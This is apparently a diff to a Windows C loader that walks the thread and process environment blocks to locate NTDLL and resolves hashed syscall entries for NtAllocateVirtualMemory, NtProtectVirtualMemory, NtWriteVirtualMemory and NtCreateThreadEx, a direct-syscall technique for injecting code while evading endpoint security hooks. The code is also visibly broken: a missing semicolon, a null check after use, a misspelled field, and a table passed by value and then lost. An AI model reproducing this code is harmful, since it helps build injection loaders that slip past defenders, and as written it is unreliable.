@@ -4,6 +4,16 @@
 
 #include "error.h"
 #include "direct_syscall.h"
+#include "structs.h"
+
+// Defined here rather than .h due to flags being used on source file.
+extern VOID DirectSysCallUpdate(WORD wSyscall);
+extern DirectSysCall();
+
+// 64-bit TEB
+PTEB RtlGetThreadEnvironmentBlock(VOID) {
+    return (PTEB)__readgsqword(0x30);
+}
 
 // Quick and dirty hash function.
 DWORD64 fnv1(PBYTE data) {
@@ -82,7 +92,38 @@ BOOL GetNtTableEntry(IN PVOID pModuleBase, IN PIMAGE_EXPORT_DIRECTORY pImageExpo
     return TRUE;
 }
 
-BOOL initiateDirectSyscallTable(void){
+// 
+BOOL initiateDirectSyscallTable(IN NtTable NtTable) {
+
+    PTEB pTeb = RtlGetThreadEnvironmentBlock();
+    PPEB pPeb = pTeb->ProcessEnvironmentBlock
+
+    if (!pPeb || !pTeb) {
+        handleError(ERROR_INVALID_ARGUMENTS, "Failed to get PEB or TEB");
+        return FALSE;
+    }
+
+    // First entry in list NTDLL module
+    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
+
+    // Init and fetch the NTDLL export table.
+    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
+    if (!GetPebImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory)) {
+        handleError(ERROR_INVALID_MODULE, "Failed to get NTDLL export directory");
+        return FALSE;
+    }
+
+    NtTable.NtAllocateVirtualMemory.dwHash = fnv1((PBYTE)"NtAllocateVirtualMemory");
+    NtTable.NtProtectVitualMemory.dwHash = fnv1((PBYTE)"NtProtectVirtualMemory");
+    NtTable.NtWriteVirtualMemory.dwHash = fnv1((PBYTE)"NtWriteVirtualMemory");
+    NtTable.NtCreateThreadEx.dwHash = fnv1((PBYTE)"NtCreateThreadEx");
+
+    for (size_t i = 0; i < sizeof(NtTable) / sizeof(NtTable.NtAllocateVirtualMemory); i++) {
+        if (!GetNtTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, (pNtTableEntry)&NtTable + i)) {
+            handleError(ERROR_INVALID_MODULE, "Failed to get NTDLL export directory");
+            return FALSE;
+        }
+    }
 
     return TRUE;
 }
